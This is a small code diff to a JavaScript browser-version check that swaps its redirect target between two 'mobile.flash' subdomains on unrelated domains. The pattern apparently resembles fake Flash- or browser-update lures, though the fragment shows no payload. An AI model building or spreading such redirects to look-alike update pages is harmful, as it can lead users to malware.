@@ -31,7 +31,7 @@
   function checkBrowser() {
     const browser = detectBrowser();
     const min = minVersions[browser.name];
-    const redirectUrl = "https://mobile.flash.northpoint.website/426.html"; // change this if needed
+    const redirectUrl = "https://mobile.flash.greatonthelakes.com/426.html"; // change this if needed
 
     if (!min) return; // Unknown browser → let it pass
 
